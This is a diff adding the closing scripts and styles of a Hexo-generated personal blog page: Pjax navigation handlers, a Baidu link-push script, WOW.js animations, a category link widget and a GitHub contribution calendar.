+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"]):not([href="/null/"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax], .pjax-reload script').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  if (typeof gtag === 'function') {
+    gtag('config', '', {'page_path': window.location.pathname});
+  }
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // Analytics
+  if (false) {
+    MtaH5.pgv()
+  }
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+
+document.addEventListener('pjax:send', function () {
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})</script><script>(function(){
+  const bp = document.createElement('script');
+  const curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https') {
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  bp.dataset.pjax = ''
+  const s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})()</script><div class="pjax-reload"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '700ms');
+    arr[i].setAttribute('data-wow-delay', '300ms');
+    arr[i].setAttribute('data-wow-offset', '80');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '700ms');
+    arr[i].setAttribute('data-wow-delay', '300ms');
+    arr[i].setAttribute('data-wow-offset', '80');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('recent-posts');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '700ms');
+    arr[i].setAttribute('data-wow-delay', '500ms');
+    arr[i].setAttribute('data-wow-offset', '80');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer="defer" src="https://cdn.jsdelivr.net/gh/graingert/wow@1.3.0/dist/wow.min.js"></script><script defer="defer" src="/js/wow_init.js"></script></div><!-- hexo injector body_end start --> <script data-pjax>if(document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+    var parent = document.getElementById('recent-posts');
+    var child = '<div class="recent-post-item" style="width:100%;height: auto"><div id="catalog_magnet"><div class="magnet_item"><a class="magnet_link" href="https://www.wawyw.top/categories/Blog/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">📚 Blog (2)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://www.wawyw.top/categories/Web安全学习/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">👩‍💻 Web安全学习 (12)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://www.wawyw.top/categories/Linux/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🐧 Linux (6)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://www.wawyw.top/categories/Python/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🐍 Python (2)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://www.wawyw.top/categories/Tools/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🔨 Tools (3)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://www.wawyw.top/categories/Arduino/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">👀 Arduino (2)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><a class="magnet_link_more"  href="https://www.wawyw.top/categories" style="flex:1;text-align: center;margin-bottom: 10px;">查看更多...</a></div></div>';
+    console.log('已挂载magnet')
+    parent.insertAdjacentHTML("afterbegin",child)}
+     </script><style>#catalog_magnet{flex-wrap: wrap;display: flex;width:100%;justify-content:space-between;padding: 10px 10px 0 10px;align-content: flex-start;}.magnet_item{flex-basis: calc(50% - 5px);background: transparent;margin-bottom: 10px;border-radius: 8px;transition: all 0.2s ease-in-out;}.magnet_item:hover{background: #ff7242}.magnet_link_more{color:#555}.magnet_link{color:black}.magnet_link:hover{color:white}@media screen and (max-width: 600px) {.magnet_item {flex-basis: 100%;}}.magnet_link_context{display:flex;padding: 10px;font-size:16px;transition: all 0.2s ease-in-out;}.magnet_link_context:hover{padding: 10px 20px;}</style>
+    <style>@font-face{ font-family:'aqqxs' ; src:url('https://cdn.jsdelivr.net/gh/2x-ercha/cdn-for-try/fonts/FXAiQingQiXiangSuo.ttf'); /* 字体文件路径 */ font-display : swap; }
+#catalog_magnet > div:nth-child(n) > a > div { font-family: 'aqqxs', sans-serif; font-size: 20px; }</style>
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.16/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?wawyw";
+            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
+            var git_user ="wawyw";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/'){
+                console.log('已挂载github calendar')
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style>undefined</style><!-- hexo injector body_end end --></body></html>
